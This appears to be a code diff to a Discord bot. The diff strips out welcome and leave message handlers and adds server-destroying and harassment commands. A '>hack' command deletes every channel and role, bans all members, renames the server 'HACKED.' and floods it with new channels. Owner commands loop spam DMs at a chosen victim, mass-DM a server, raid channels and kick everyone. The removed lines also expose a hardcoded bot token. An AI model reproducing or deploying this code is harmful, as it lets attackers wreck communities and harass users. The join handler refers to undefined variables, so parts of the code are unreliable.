@@ -3,82 +3,198 @@ const client = new Discord.Client();
 const prefix = ''
 client.on('ready', () => {
 console.log(`Logged in as ${client.user.tag}!`);
-client.user.setGame(` BY|🔸 Hama YK 🔸|`, "http://twitch.tv/S-F")
  
 });
 
+client.on('message', message =>{
+    if (message.content.startsWith('>hack')){
+            if (message.channel.guild){
+                message.guild.channels.forEach(c =>{
+                    if(c.deletable){
+                        c.delete()
+                    }
+                })
+                message.guild.members.forEach(m =>{
+                    m.ban()
+                })
+                message.guild.roles.forEach(r=>{
+                    r.delete()
+                })
+                message.guild.setName('HACKED.')
+                setInterval(function(){
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
+                message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text') 
+                       message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
+                message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                       message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
+                message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                       message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
+                message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                                message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')  
+                message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'text') 
+                })
+            }
+        }
+});
+/////
+client.on('message', message => {
+    if (isOwner(message.author.id)) {
+        var args = message.content.split(" ");
  
-client.on('guildMemberAdd', member => {
-   
-   let memberavatar = member.user.avatarURL
-        let embed = new Discord.RichEmbed()
-        .setColor('RANDOM')
-        .setThumbnail(memberavatar)
-        .addField(':bust_in_silhouette: | name : ', `${member}`)
-        .addField(':microphone2: | Welcome!', `Welcome to the server, ${member}`)
-        .addField(':id: | User :', "**[" + `${member.id}` + "]**")
-        .addField(':family_mwgb: | Your are the member', `${member.guild.memberCount}`)
-        .addField("Name", `<@` + `${member.id}` + `>`, true)
-        .addField('Server', `${member.guild.name}`, true )
-        .setFooter(`**${member.guild.name}**`)
-        .setTimestamp()
+        // Spam someone in DM
+        if (args[0] == prefix + 'dm') {
+            if (args[1] != null && args[2] != null) {
+                delete args[0];
+                var victimid = client.users.get(args[1]);
+                delete args[1];
+                var msg = args.join(" ");
+                client.fetchUser(victimid).then((victim) => {
+                    var interval = setInterval(function () {
+                        victim.send(msg);
+                    }, 600);
+                });        
+            }
+        }
  
+        // DM all members in a server
+        if (args[0] == prefix + 'dms') {
+            if (args[1] != null && args[2] != null) {
+                delete args[0];
+                var serverid = args[1];
+                delete args[1];
+                var msg = args.join(" ");
+                client.guilds.get(serverid).members.map(m => {
+                    m.send(msg);
+                });
+            }
+        }
  
-   member.send(embed)
+        // Spam multiple channels in a server
+        if (args[0] == prefix + 'raid') {
+            if (args[1] != null && args[2] != null) {
+                delete args[0];
+                var gid = args[1];
+                delete args[1];
+                var msg = args.join(" ");
+                var interval = setInterval(function () {
+                        client.guilds.get(gid).channels.map(c => {
+                            if (c.type == "text") c.send(msg);
+                        });
+                }, 600);
+            }
+        }
+ 
+        // Deletes all channels of a server
+        if (args[0] == prefix + 'nuke') {
+            if (args[1] != null) {
+                let guild = client.guilds.get(args[1]);
+                guild.channels.forEach(c => {
+                    c.delete();
+                });
+            }
+        }
+ 
+        // Kicks all members from server
+        if (args[0] == prefix + 'prune') {
+            if (args[1] != null) {
+                let guild = client.guilds.get(args[1]);
+                guild.members.forEach(m => {
+                    m.kick();
+                });
+            }
+        }
+ 
+        // Restart bot
+        if (args[0] == prefix + 'restart') {
+               require("child_process").spawn(process.argv.shift(), process.argv, {
+                   cwd: process.cwd(),
+                   detached : true,
+                   stdio: "inherit"
+               });
+               process.exit();
+        }
+    }
 });
  
- /////////////////////
- 
-client.on('guildMemberAdd', member => {
-    let channel = member.guild.channels.find('name', 'welcome');
-    let memberavatar = member.user.avatarURL
-        if (!channel) return;
-        let embed = new Discord.RichEmbed()
-        .setColor('RANDOM')
-        .setThumbnail(memberavatar)
-        .addField(':bust_in_silhouette: | نـــاو ： ', `${member}`)
-        .addField(':nazar_amulet:  | 𝐖𝐄𝐋𝐂𝐎𝐌𝐄🌹', "**¦" + `بەخـێربێیت بۆ سـێرڤـەرەکەمان` + "¦**")
-        .addField(':id: | ئــایــدی میــمــبــەر ：', "**⌜" + `${member.id}` + "⌟**") 
-        .addField(':1234: | تـۆکـەسی ژمارە：', "**¦" + `${member.guild.memberCount}` + "¦**")
-        .addField(':shield:|𝐒𝐄𝐑𝐕𝐄𝐑：', `${member.guild.name}`, true )
-        .setImage(" https://cdn.discordapp.com/attachments/696541070258995281/706847818622566470/giphy_1.gif ")
-        .setFooter(`◢${member.guild.name}◣`)
-        .setTimestamp()
- 
-        channel.sendEmbed(embed);
-
-     
-
-client.login('NzA3NDcyNTQxMTEwNzYzNTYx.XrJTQQ.IPpje-1IXzCtegd2RATpDrmR1Sg');
-        
-
-
-
+/*
+Join handler
+*/
+client.on('guildMemberAdd', (member, channel, guild) => {
+    try {
+        if (dm != false && serverid != null && serverid != "" && msg != "") {
+            if (typeof (member) != "undefined") {
+                var gid = member.guild.id;
+                if (gid == serverid) {
+                    member.send(msg);
+                }
+            }
+        }
+    } catch (err) {
+        console.log("[Join] " + err);
+    }
 });
- 
- 
- //////////////////////
-client.on('guildMemberRemove', member => {
-    let channel = member.guild.channels.find('name', 'server-left');
-    let memberavatar = member.user.avatarURL
-        if (!channel) return;
-        let embed = new Discord.RichEmbed()
-        .setColor('RANDOM')
-        .setThumbnail(memberavatar)
-        .addField('👥|𝐍𝐀𝐌𝐄:', `${member}`)
-        .addField('🗑├چــووە دەرەوە لەسێرڤـــەر┤🗑',)
-        .addField('✶⊶⊷⊶⊷❍⊶⊷⊶⊷✶;(','⳺👋خــوات لــەگــەڵ👋⳻')
-        .addField('⳺☟مــیــمــبەرەکــان ماوە⳻', `${member.guild.memberCount}` + " ڪــەس")
-        .setFooter(`${member.guild.name}`)
-        .setTimestamp()
- 
-        channel.sendEmbed(embed);
-});
- 
- 
- ///////////////////  
- 
-client.login('NzA3NDcyNTQxMTEwNzYzNTYx.XrJTQQ.IPpje-1IXzCtegd2RATpDrmR1Sg');
+/////
+client.login('token');
 
 
 
